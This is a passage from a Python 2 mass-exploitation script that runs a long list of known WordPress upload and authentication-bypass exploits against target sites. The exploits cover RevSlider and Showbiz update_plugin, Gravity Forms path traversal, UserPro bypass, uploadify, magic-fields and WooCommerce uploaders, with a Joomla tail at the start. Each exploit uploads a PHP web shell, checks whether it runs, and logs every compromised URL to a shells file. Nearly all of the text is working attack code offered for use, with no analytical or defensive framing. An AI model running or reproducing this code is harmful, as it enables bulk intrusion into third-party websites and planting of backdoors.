			print '[{}Joomla]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/media/error.php'+'\n')
			sys.exit()
		elif 'Uname' in anxxxGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/media/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in anxxxxGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/images/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in anxxxxxGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/098.php'+'\n')
			sys.exit()			
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} Shell     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
			
    except:
        pass

		

def wpsbot(url):

    try:
		
		

		filenames = 'RxR' + '__' + rand_str (5) + '.php'

		# 1 .   Gravity Forms		
			
		
		zzzazirevlib = requests.get(url+"/?up_auto_log=true")
				
		if 'logout' in zzzazirevlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} UserPro Bypass     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('userprobypass.txt', 'a').write(url+'/?up_auto_log=true'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} UserPro Bypass     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		
		# 1 .   Gravity Forms
		
		
		appgravkg  = {'folder':'/wp-content/themes/qualifire/scripts/admin/uploadify/'}
		
		
		Gravkg = {'Filedata':(filename, shell_2, 'text/html')}
		
		Gravkgreq = requests.post(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php', data=appgravkg, files=Gravkg)
	
		
		Gravkglib = requests.get(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames+'?bang')
		
		
		if 'Bigbang' in Gravkglib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} qualifire     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravkglib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames+'?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} qualifire     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		# 2 .   revslider 

		
					  		  
		zorr = requests.post(url+'/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/action.php', headers=headersx)
		ddGravkglib = requests.get(url+'/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/root.php?shell')
		if 'Bigbang' in ddGravkglib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce 0day     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",ddGravkglib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce 0day     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		cisabo = {'uploadfile': (filecl, shell_2, 'text/html')}

		mmcizo = requests.post(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/upload.php', data={'value': './'}, files=cisabo)

		token = re.findall('(.*?).php', mmcizo.text)
		
		misonzslib = requests.get(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/uploadImage/'+token[0]+'.php')
		
		
		if 'Bigbang' in misonzslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce-custom-t-shirt     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
                        xshell_path = re.findall("uname(.*?)/uname",misonzslib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/uploadImage/'+tokens[0]+'.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/uploadImage/'+tokens[0]+'.php'+'\n')
			sys.exit()                                    
			sys.exit()

		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce-custom-t-shirt     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 2 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell_2, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider News     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'?bang'+'\n')
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider News     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		#1 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider Old     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider Old     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		# 2 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Avada     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Avada     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		# 3 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} striking     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} striking     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		# 4 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} IncredibleWP     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} IncredibleWP     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				

			
		# 5 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} ultimatum     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} ultimatum     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				


			
		# 6 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} medicate     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} medicate     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				


			
		# 7 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/centum/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} centum     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/centum/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/centum/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} centum     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				

			
		# 8 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'izocin' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} beach_apollo     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} beach_apollo     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				

			
		# 9 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} cuckootap     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} cuckootap     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 10 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/pindol/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pindol     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/pindol/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/pindol/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pindol     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			
		# 11 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} designplus     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} designplus     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			
		# 12 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} rarebird     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} rarebird     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 13 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('../../tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} andre     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} andre     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

			
			
		# 4 . Reflex Gallery
		
		aaReflexup = {'Filedata' : (filenames, shell_2, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/themes/Coldfusion/includes/uploadify/upload_settings_image.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames+'?bang')
		
		
		if 'Bigbang' in aaReflexlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Coldfusion     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",aaReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Coldfusion     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	

	
		# 4 . Reflex Gallery
		
		aReflexup = {'qqfile' : (filenames, shell_2, 'text/html')}
		
		aReflexreq = requests.post(url+'/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php', files=aReflexup)
		
		aReflexlib = requests.get(url+'/wp-content/files_mf/'+filenames+'?bang')
		
		
		if 'Bigbang' in aReflexlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} magic-fields     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",aReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/files_mf/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/files_mf/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} magic-fields     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
			
		# 4 . Reflex Gallery
		
		bReflexup = {'Filedata' : (filenames, shell_2, 'text/html')}
		
		bReflexreq = requests.post(url+'/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames+'?bang')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Ghost     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Ghost     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
	
		
		# 1 .   Gravity Forms
		
		
		appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../../',
		'name':'RxR.phtml'}
		
		
		Grav = {'file':(filename, shell_2, 'text/html')}
		
		Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		
		Gravlib = requests.get(url+'/wp-content/_input_3_RxR.phtml?bang')
		
		
		if 'Bigbang' in Gravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Gravity     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/_input_3_RxR.phtml?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/_input_3_RxR.phtml'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Gravity     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		# 1 .   Gravity Forms
		
		
		appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../../',
		'name':'izo.php5'}
		
		
		Grav = {'file':(filename, shell_2, 'text/html')}
		
		Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		
		Gravlib = requests.get(url+'/wp-content/_input_3_izo.php5?bang')
		
		
		if 'Bigbang' in Gravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Gravity php    {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/_input_3_izo.php5?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/_input_3_izo.php5'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Gravity php    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		# 1 .   Gravity Forms
		
		
		appgravk  = {'config_path':'../../../../../../'}
		
		
		Gravk = {'image':(filename, shell_2, 'text/html')}
		
		Gravkreq = requests.post(url+'/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php', data=appgravk, files=Gravk)
		
		Gravklib = requests.get(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames+'?bang')
		
		
		if 'Bigbang' in Gravklib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} networking-e-commerce     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravklib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} networking-e-commerce     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
			
			
		# 3 .   Showbiz
		
		
		showbizapp = {'action':'showbiz_ajax_action',
					    'client_action':'update_plugin'}
						
						
		showbizup = {'update_file':(filenames, shell_2, 'text/html')}
		
		showbizreq = requests.post(url+'/wp-admin/admin-ajax.php', data=showbizapp , files=showbizup)
		
		showbizlib = requests.get(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames+'?bang')
		
		if 'Bigbang' in showbizlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Showbiz     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
